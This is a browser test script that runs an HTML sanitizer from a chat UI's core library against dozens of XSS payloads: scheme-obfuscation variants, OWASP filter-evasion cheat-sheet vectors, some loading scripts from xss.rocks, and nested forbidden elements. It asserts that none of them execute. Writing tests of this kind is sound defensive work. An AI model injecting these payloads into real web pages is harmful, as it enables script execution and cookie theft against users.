#!/usr/bin/env node
// Usage: node this-file /absolute/path/to/output
// SF.sanitizeHtml in a real browser, from the built core.js: the parser that
// decides what HTML means is the browser's, so this is where a bypass would
// show. The vectors are the chat window's (ui-chat tests/browser/
// sanitize.test.mjs at 0304327, where the helper came from), unchanged, and so
// are the expected outputs: the same input gives the same output there and
// here. They are the schemes javascript:, data: and vbscript: in mixed case,
// with entities and whitespace; nested forbidden elements; and the OWASP XSS
// filter evasion cheat sheet's families.
import {createServer} from 'node:http';
import {existsSync, readFileSync, statSync} from 'node:fs';
import {extname, join, resolve} from 'node:path';
import {chromium} from 'playwright';

if (!process.argv[2]) throw new Error('Build output root is required');
const out = resolve(process.argv[2]);
const parts = {core: join(out, 'core', 'core'), rule: join(out, 'core', 'rule')};
const page = () => `<!doctype html><html lang="ru"><head><meta charset="utf-8">
<script>window.sfPath='/distr/';window.sfSmartPath='/distr/';window.SF_BOOT_CONFIG={preloader:{enabled:false},icons:{enabled:false}};</script>
<link rel="stylesheet" href="/distr/core/css/core.css">
<script src="/distr/core/js/core.js"></script></head><body><main>Страница</main></body></html>`;
const types = {'.js': 'text/javascript', '.css': 'text/css', '.json': 'application/json', '.woff2': 'font/woff2'};
const server = createServer((request, response) => {
  const path = decodeURIComponent(new URL(request.url, 'http://probe').pathname);
  if (path === '/') {
    response.writeHead(200, {'content-type': 'text/html; charset=utf-8'});
    return response.end(page());
  }
  const match = path.match(/^\/distr\/([^/]+)\/(.+)$/u);
  const file = match && parts[match[1]] ? join(parts[match[1]], match[2]) : '';
  if (!file || !existsSync(file) || statSync(file).isDirectory()) {
    response.writeHead(404);
    return response.end();
  }
  response.writeHead(200, {'content-type': types[extname(file)] ?? 'application/octet-stream'});
  return response.end(readFileSync(file));
}).listen(0, '127.0.0.1');
await new Promise((settle) => server.once('listening', settle));

// The chat's fixture probe (ui-chat mock/fixtures/messages.json, xss_probe).
const PROBE = '<p>Текст<img src=x onerror=alert(1)><script>alert(2)</script><a href="javascript:alert(3)">ссылка</a></p>';

const SCHEMES = [];
for (const scheme of ['javascript', 'JaVaScRiPt', 'vbscript', 'VBScript', 'data', 'DaTa']) {
  const payload = scheme.toLowerCase().startsWith('data') ? `${scheme}:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` : `${scheme}:alert(1)`;
  SCHEMES.push(
    `<a href="${payload}">x</a>`,
    `<a href=" ${payload}">x</a>`,
    `<a href="\t${payload}\n">x</a>`,
    `<a href="${payload.replace(':', '&#58;')}">x</a>`,
    `<a href="${payload.replace(':', '&colon;')}">x</a>`,
    `<a href="${payload.slice(0, 4)}&#x09;${payload.slice(4)}">x</a>`,
    `<a href="${payload.slice(0, 4)}&#0000106${payload.slice(4)}">x</a>`,
    `<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">x</a>`,
    `<a href="${payload.slice(0, 3)}\u0000${payload.slice(3)}">x</a>`,
  );
}

// The OWASP cheat sheet's families, one or two of each.
const OWASP = [
  '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>',
  '<IMG SRC="javascript:alert(\'XSS\');">',
  '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
  '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
  '<a onmouseover="alert(document.cookie)">xxs link</a>',
  '<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\\>',
  '<IMG SRC=# onmouseover="alert(\'xxs\')">',
  '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>',
  '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">',
  '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
  '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">',
  '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>',
  '<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>',
  '<<SCRIPT>alert("XSS");//\\<</SCRIPT>',
  '<SCRIPT SRC=http://xss.rocks/xss.js?< B >',
  '<iframe src=http://xss.rocks/scriptlet.html <',
  '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
  '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
  '<BODY BACKGROUND="javascript:alert(\'XSS\')">',
  '<svg/onload=alert(\'XSS\')>',
  '<BODY ONLOAD=alert(\'XSS\')>',
  '<BGSOUND SRC="javascript:alert(\'XSS\');">',
  '<BR SIZE="&{alert(\'XSS\')}">',
  '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
  '<STYLE>@import\'http://xss.rocks/xss.css\';</STYLE>',
  '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
  '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
  '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
  '<TABLE BACKGROUND="javascript:alert(\'XSS\')"><TR><TD BACKGROUND="javascript:alert(\'XSS\')">x</TD></TR></TABLE>',
  '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">x</DIV>',
  '<DIV STYLE="width: expression(alert(\'XSS\'));">x</DIV>',
  '<BASE HREF="javascript:alert(\'XSS\');//">',
  '<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>',
  '<EMBED SRC="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+" type="image/svg+xml" AllowScriptAccess="always"></EMBED>',
  '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(\'XSS\')"></B></I></XML>',
  '<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert(&quot;XSS&quot;)</SCRIPT>"></BODY></HTML>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<form><button formaction="javascript:alert(1)">x</button></form>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<details open ontoggle=alert(1)>x</details>',
  '<template><img src=x onerror=alert(1)></template>',
  '<p>[1]</p><base href="javascript:alert(1)//">',
  '<a href="//evil.example/x">x</a>',
  '<a href="/\\evil.example">x</a>',
  '<p id="x" class="y" style="color:red" data-x="1" onclick="alert(1)" title="t">x</p>',
  '<code class="language-js x" onmouseover=alert(1)>x</code>',
  '<td colspan="2 onmouseover=alert(1)" scope="javascript:alert(1)">x</td>',
];

const NESTED = [
  '<div><span><script>alert(1)</script>текст</span></div>',
  '<svg><foreignObject><p onclick="alert(1)">x</p></foreignObject></svg>',
  '<object><embed><iframe><p>x</p></iframe></embed></object>',
  '<style><img src=x onerror=alert(1)></style><p>after</p>',
  '<ul><li><a href="javascript:alert(1)"><strong>x</strong></a></li></ul>',
];

const ALLOWED_ATTRIBUTE = /^(a\[(href=(https?:\/\/|mailto:|\/[^/\\])|rel=noopener noreferrer nofollow|target=_blank)|t[dh]\[(colspan|rowspan)=\d+\]|t[dh]\[scope=(row|col|rowgroup|colgroup)\])/;

const failures = [];
const check = (ok, message) => { if (!ok) failures.push(message); };
const browser = await chromium.launch();
try {
  const tab = await browser.newPage();
  await tab.goto(`http://127.0.0.1:${server.address().port}/`);
  await tab.waitForFunction(() => typeof window.SF?.sanitizeHtml === 'function', null, {timeout: 10000});
  await tab.evaluate(() => {
    window.__alerts = [];
    window.alert = (value) => window.__alerts.push(value);
  });

  const run = (inputs, policy) => tab.evaluate(async ({inputs, policy}) => {
    const host = document.createElement('div');
    document.body.append(host);
    for (const input of inputs) host.append(window.SF.sanitizeHtml(input, policy));
    await new Promise((done) => setTimeout(done, 300));
    for (const element of host.querySelectorAll('*')) {
      for (const type of ['click', 'mouseover', 'focus', 'toggle']) element.dispatchEvent(new Event(type, {bubbles: true}));
    }
    await new Promise((done) => setTimeout(done, 100));
    const result = {
      alerts: window.__alerts.slice(),
      tags: [...new Set([...host.querySelectorAll('*')].map((one) => one.localName))],
      attributes: [...host.querySelectorAll('*')].flatMap((one) => [...one.attributes].map((attr) => `${one.localName}[${attr.name}=${attr.value}]`)),
    };
    host.remove();
    return result;
  }, {inputs, policy});
  const html = (input, policy) => tab.evaluate(({input, policy}) => {
    const host = document.createElement('div');
    host.append(window.SF.sanitizeHtml(input, policy));
    return host.innerHTML;
  }, {input, policy});

  for (const [name, inputs] of [['schemes', SCHEMES], ['OWASP cheat sheet', OWASP], ['nested forbidden elements', NESTED]]) {
    const report = await run(inputs);
    check(report.alerts.length === 0, `${name}: something executed: ${JSON.stringify(report.alerts)}`);
    for (const tag of report.tags) {
      check(['p', 'a', 'table', 'tbody', 'tr', 'td', 'code', 'br', 'strong', 'ul', 'li'].includes(tag), `${name}: unexpected <${tag}>`);
    }
    for (const attribute of report.attributes) check(ALLOWED_ATTRIBUTE.test(attribute), `${name}: unexpected ${attribute}`);
  }

  const schemes = await tab.evaluate((inputs) => {
    const host = document.createElement('div');
    for (const input of inputs) host.append(window.SF.sanitizeHtml(input));
    return {links: host.querySelectorAll('a').length, text: host.textContent};
  }, SCHEMES);
  check(schemes.links === 0, 'every scheme vector loses its href');
  check(schemes.text === 'x'.repeat(SCHEMES.length), 'every scheme vector keeps its text');

  const shape = await tab.evaluate(() => {
    const result = window.SF.sanitizeHtml('<p>a</p>');
    const empty = [null, undefined, '', 42].map((value) => window.SF.sanitizeHtml(value).childNodes.length);
    return {fragment: result instanceof DocumentFragment, owner: result.ownerDocument === document, empty,
      safeHref: [window.SF.safeHref(' https://a.example/x '), window.SF.safeHref('/docs/a'), window.SF.safeHref('//evil.example'), window.SF.safeHref('java\tscript:alert(1)')]};
  });
  check(shape.fragment && shape.owner, 'the result is a DocumentFragment of the given document');
  check(JSON.stringify(shape.empty) === '[0,0,0,0]', 'no string, or an empty one, is an empty fragment');
  check(JSON.stringify(shape.safeHref) === JSON.stringify(['https://a.example/x', '/docs/a', null, null]), `SF.safeHref: ${JSON.stringify(shape.safeHref)}`);

  const probe = await html(PROBE);
  check(probe === '<p>Текстссылка</p>', `the fixture probe keeps its text and loses its link: ${probe}`);

  const headings = await html('<h2>A</h2><h3>B</h3><h4>C</h4><p><del>old</del> new</p><h1>D</h1><s>E</s>');
  check(headings === '<h2>A</h2><h3>B</h3><h4>C</h4><p><del>old</del> new</p>DE', `Markdown headings and strike-through pass: ${headings}`);

  const input = '<h3>Итог</h3><p><strong>28</strong> дней, <em>см.</em> <a href="https://example.gov.ru/tk/125">ТК</a> и <a href="/app/help">справку</a></p><pre><code class="language-js">a &lt; b</code></pre><blockquote>цитата</blockquote><ul><li>раз</li></ul><table><thead><tr><th colspan="2" scope="col">A</th></tr></thead></table>';
  const expected = '<h3>Итог</h3><p><strong>28</strong> дней, <em>см.</em> <a href="https://example.gov.ru/tk/125" rel="noopener noreferrer nofollow" target="_blank">ТК</a> и <a href="/app/help" rel="noopener noreferrer nofollow" target="_blank">справку</a></p><pre><code>a &lt; b</code></pre><blockquote>цитата</blockquote><ul><li>раз</li></ul><table><thead><tr><th colspan="2" scope="col">A</th></tr></thead></table>';
  const plain = await html(input, {codeLanguage: false});
  const withLanguage = await html(input, {codeLanguage: true});
  check(plain === expected, `allowed markup passes intact: ${plain}`);
  check(withLanguage === expected.replace('<code>', '<code class="language-js">'), `code keeps its language only on request: ${withLanguage}`);

  // A policy narrows the list, never widens it past the dropped elements.
  const narrowed = await html('<p>a <strong>b</strong></p><script>alert(4)</script>', {elements: ['p', 'script']});
  check(narrowed === '<p>a b</p>', `a policy narrows the list and cannot allow a dropped element: ${narrowed}`);
} finally {
  await browser.close();
  server.close();
}
if (failures.length) { console.error(JSON.stringify({failures}, null, 1)); process.exit(1); }
console.log('SANITIZE_HTML_OK');
